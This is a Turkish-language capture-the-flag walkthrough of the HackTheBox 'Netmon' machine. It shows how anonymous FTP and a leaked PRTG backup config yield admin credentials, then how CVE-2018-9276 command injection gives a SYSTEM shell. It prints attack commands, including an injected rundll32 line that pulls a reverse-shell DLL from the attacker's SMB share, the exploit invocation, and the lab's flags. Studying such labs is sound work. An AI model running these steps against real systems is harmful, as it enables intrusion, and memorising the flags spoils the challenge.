<img width="586" height="315" alt="1_ZWle9bYFwiUs2DnQzrvgLw" src="https://github.com/user-attachments/assets/b4677355-b48a-4640-b21b-47cf74549507" />

## About
Netmon is an easy difficulty Windows box with simple enumeration and exploitation. PRTG is running, and an FTP server with anonymous access allows reading of PRTG Network Monitor configuration files. The version of PRTG is vulnerable to RCE which can be exploited to gain a SYSTEM shell.


## 2. Keşif

Standart bir nmap taraması ile başladım:

```
nmap -sS -A -p- -T5 --script vuln 10.129.230.176
```

Öne çıkan portlar:

| Port | Servis | Not |
|------|--------|-----|
| 21 | FTP (Microsoft ftpd) | Anonim erişime açık |
| 80 | HTTP — Paessler PRTG Network Monitor 18.1.37.13946 | Web arayüzü |
| 135/139/445 | RPC / SMB | Standart Windows servisleri |
| 5985 / 47001 | WinRM / HTTPAPI | |

`Server` header'ından PRTG sürümünü net şekilde görebiliyoruz: `PRTG/18.1.37.13946`. Bu sürüm numarası ilerleyen adımlarda kritik önem taşıyor çünkü CVE-2018-9276, **18.2.39'dan önceki** tüm sürümleri etkiliyor.

<img width="706" height="653" alt="nmap" src="https://github.com/user-attachments/assets/c3ec279a-7f3e-4782-8174-f88f0645db6d" />

---

## 3. Anonim FTP ile Enumerasyon

Port 21'de anonim login kapalı değildi:

```
ftp 10.129.230.176
Name: Anonymous
Password: (boş / herhangi bir e-posta)
230 User logged in.
```

FTP kökü doğrudan `C:\` sürücüsüne karşılık geliyordu. `Users\Public\Desktop` altında `user.txt` flag'i açık haldeydi:

```
ftp> cd Users/Public/Desktop
ftp> get user.txt
ftp> cat user.txt
5fd6f400bed6b790b89ce473357ff37d
```

<img width="314" height="63" alt="userflag" src="https://github.com/user-attachments/assets/cfaa98b7-8f06-459a-ba8c-2a461ab1aa0d" />

İlk kullanıcı flag'i buradan alındı. Aynı klasörde `PRTG Enterprise Console.lnk` ve `PRTG Network Monitor.lnk` dosyaları da vardı; `.lnk` dosyalarını `exiftool` ile inceledim ve bunlar bana hedefte hangi PRTG bileşenlerinin kurulu olduğunu ve kurulum yolunu (`C:\Program Files (x86)\PRTG Network Monitor\`) doğruladı. Buradan `searchsploit` ile PRTG için bilinen exploit'lere baktım ve **CVE-2018-9276 Authenticated RCE**'nin hedefimizdeki sürümü (< 18.2.39) etkilediğini gördüm. Bu exploit'i çalıştırmak için geçerli bir admin credential'ına ihtiyacım vardı.

---

## 4. Konfigürasyon Dosyasından Parola Çıkarma

PRTG, ayarlarını ve yedeklerini `C:\ProgramData\Paessler\PRTG Network Monitor\` dizininde tutuyor. FTP üzerinden buraya tekrar gittim:

```
ftp> cd ProgramData/Paessler/PRTG Network Monitor
ftp> ls
PRTG Configuration.dat
PRTG Configuration.old
PRTG Configuration.old.bak
```

`.dat` ve `.old` dosyalarına "Access is denied" hatası alındı (muhtemelen servis tarafından kilitli tutuluyor), ama **`.old.bak`** dosyası kilitli değildi ve indirilebildi:

```
ftp> get "PRTG Configuration.old.bak"
```

<img width="1067" height="692" alt="get2" src="https://github.com/user-attachments/assets/c13600f5-81b0-4618-a9bd-4300158dac6f" />

Dosya düz metin XML formatında. İçinde `prtgadmin` kullanıcısına ait parola buldum:

<img width="413" height="78" alt="passwd" src="https://github.com/user-attachments/assets/93a022b3-c204-4b3d-90b2-5afc5998ed20" />


`prtgadmin / PrTg@dmin2018` ile web paneline giriş denedim ama başarısız oldu. Buradan çıkardığım sonuç: sistem yöneticisi bu şifreyi periyodik olarak (muhtemelen yıllık) değiştiriyor, ama pattern'i koruyor. Yılı bir sonrakine çevirdim (`PrTg@dmin2019`) ve giriş başarılı oldu.

---

## 5. Zafiyet Analizi — CVE-2018-9276 (PRTG Authenticated RCE)

### 5.1 Zafiyetin Kökeni

<img width="1061" height="631" alt="login" src="https://github.com/user-attachments/assets/e46b7c71-83a7-4b4f-8172-eab589d9fa98" />

PRTG Network Monitor, "Notification" (bildirim) özelliği altında bir sensör down/up olduğunda **harici bir EXE veya script çalıştırma** imkanı sunar (`Execute Program/Script` notification action). Bu özellik meşru bir kullanım senaryosu — örneğin bir alarm scripti tetiklemek için tasarlanmış.

Sorun şu: bu notification objesi **web arayüzü üzerinden `/editsettings` endpoint'ine POST edilen form verisiyle** oluşturuluyor ve sunucu tarafında bu parametreler yeterince temizlenmeden (sanitize edilmeden) **doğrudan işletim sistemi komut satırına** aktarılıyor. Yani kimliği doğrulanmış (authenticated) herhangi bir kullanıcı, "EXE Notification" alanına bir dosya adı + ekstra parametre enjekte ederek, PRTG Core Server servisinin (genellikle **SYSTEM** yetkisiyle çalışır) çalıştırdığı komut satırına kendi komutunu ekleyebiliyor.

Özetle bu bir **command injection** zafiyeti — SQL injection'daki mantığın aynısı, sadece hedef veritabanı sorgusu değil, işletim sistemi shell'i.

### 5.2 Neden "Authenticated"?

CVE-2018-9276'nın çalışması için geçerli bir PRTG oturumu (login) gerekiyor. Yani bu tek başına bir "unauthenticated RCE" değil — önce bir şekilde credential elde etmemiz lazımdı. Bizim senaryomuzda bu credential'ı FTP üzerinden sızan config dosyasından elde ettik. Gerçek dünyada bu genelde şu yollarla olur:

- Varsayılan şifre (`prtgadmin/prtgadmin`) değiştirilmemiş olması
- Zayıf/tahmin edilebilir şifreler
- Başka bir zafiyetten (bizim durumumuzda FTP) sızan credential

### 5.3 İstismar Akışı (Exploit Mekaniği)

CVE-2018-9276 exploit'i (Alvin Smith'in `exploit.py`, Python3 portu) şu adımları otomatikleştiriyor:

1. **`get_session()`** — `prtgadmin` credential'larıyla `/public/checklogin.htm`'e POST atıp geçerli bir session cookie alıyor.

2. **`createFile()`** — `/editsettings` endpoint'ine, geçerli bir session cookie ile birlikte, notification ayarları formunu POST ediyor. Bu formun içinde `address_10` parametresi (Execute Program notification hedefi) manipüle edilerek sunucuda `C:\Users\Public\tester.txt` adında zararsız bir dosya "stage" ediliyor. Bu adım aslında injection'ın çalıştığını doğrulamak için kullanılan bir ara adım.

3. **`msfvenom`** ile bir reverse shell payload'ı **DLL** formatında üretiliyor (`windows/shell_reverse_tcp`).

4. **Impacket'in SMB server modülü** kullanılarak, kendi makinemizde geçici bir SMB paylaşımı (share) ayağa kaldırılıyor ve üretilen DLL bu paylaşım üzerinden erişilebilir hale getiriliyor (`\\<LHOST>\<SHARENAME>\<payload>.dll`).

5. **`prepareCommand()`** — Bu sefer notification'ın "Execute Program" alanına gerçek payload komutu enjekte ediliyor:
   ```
   rundll32.exe \\10.10.14.187\SHARENAME\payload.dll,0
   ```
   `rundll32.exe`, kendi ağımızdaki SMB paylaşımından DLL'i UNC path üzerinden çekip belleğe yüklüyor ve export edilen fonksiyonu (reverse shell shellcode) çalıştırıyor.

6. **`notify()`** — `/api/notificationtest.htm` endpoint'ine bu notification objesinin ID'si POST edilerek **manuel olarak tetikleniyor**. PRTG bu notification'ı "test et" komutuyla hemen çalıştırıyor; normalde bir sensör down/up olayını beklemesi gerekmezdi çünkü test endpoint'i anında tetikleme sağlıyor.

7. PRTG Core Server servisi (SYSTEM olarak çalışıyor) bu komutu işletim sistemi seviyesinde execute ediyor → `rundll32` çalışıyor → DLL'in içindeki shellcode tetikleniyor → bize **SYSTEM yetkisiyle** reverse shell dönüyor.

Bu zincirin en kritik noktası: **komutu tetikleyen servis SYSTEM olarak çalıştığı için, düşük yetkili bir web kullanıcısı (prtgadmin gibi bir uygulama-içi rol) ile bile doğrudan işletim sistemi seviyesinde en yüksek yetkiye atlanabiliyor.** Bu yüzden "authenticated" olması zafiyeti hafifletmiyor — çünkü web paneline erişim genelde işletim sistemine erişimden çok daha kolay elde edilen bir şey.

### 5.4 İstismarın Pratikte Uygulanması

```
git clone https://github.com/A1vinSmith/CVE-2018-9276
cd CVE-2018-9276

./exploit.py -i 10.129.230.176 -p 80 --lhost 10.10.14.187 --lport 4444 \
  --user prtgadmin --password PrTg@dmin2019
```

<img width="1060" height="764" alt="shell" src="https://github.com/user-attachments/assets/c6b29c64-6635-423a-80c7-a45b3365936b" />

Netcat listener otomatik olarak açılıyor ve birkaç saniye içinde bağlantı geldi:

Shell doğrudan `NT AUTHORITY\SYSTEM` bağlamında geldiği için privilege escalation adımına hiç gerek kalmadı.

---

## 6. Post-Exploitation — Root Flag

```
C:\Windows\system32> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> type root.txt
d43f790f7ab8f6cf89718636daf16b4d
```

<img width="508" height="318" alt="flag" src="https://github.com/user-attachments/assets/f32213ea-b1e9-4395-ade9-ee833549fe7a" />
